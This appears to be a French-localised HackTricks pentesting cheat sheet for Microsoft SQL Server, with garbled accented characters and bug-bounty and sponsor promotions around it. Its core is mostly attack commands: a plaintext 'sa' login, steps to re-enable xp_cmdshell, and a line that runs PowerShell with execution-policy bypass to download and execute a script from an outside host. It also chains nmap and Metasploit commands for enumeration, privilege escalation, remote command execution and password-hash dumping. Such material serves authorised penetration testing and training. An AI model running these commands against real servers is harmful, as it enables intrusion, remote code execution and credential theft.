Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Ma√Ætrisez la s√©curit√© web3 d√®s ses d√©buts.

**Devenez la l√©gende du hacker web3**\
Gagnez des points de r√©putation avec chaque bug v√©rifi√© et conqu√©rez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez √† gagner gr√¢ce √† vos hacks !

{% embed url="https://hackenproof.com/register" %}

## Commandes automatiques HackTricks
```
Protocol_Name: MSSQL    #Protocol Abbreviation if there is one.
Port_Number:  1433     #Comma separated if there is more than one.
Protocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MSSQL
Note: |
Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications‚Äîwhich may run either on the same computer or on another computer across a network (including the Internet).

#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G

###the goal is to get xp_cmdshell working###
1. try and see if it works
xp_cmdshell `whoami`
go

2. try to turn component back on
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell `whoami`
go

3. 'advanced' turn it back on
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell' , 1
reconfigure
go
xp_cmdshell 'whoami'
go




xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')"


https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server

Entry_2:
Name: Nmap for SQL
Description: Nmap with SQL Scripts
Command: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}

Entry_3:
Name: MSSQL consolesless mfs enumeration
Description: MSSQL enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit'

```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
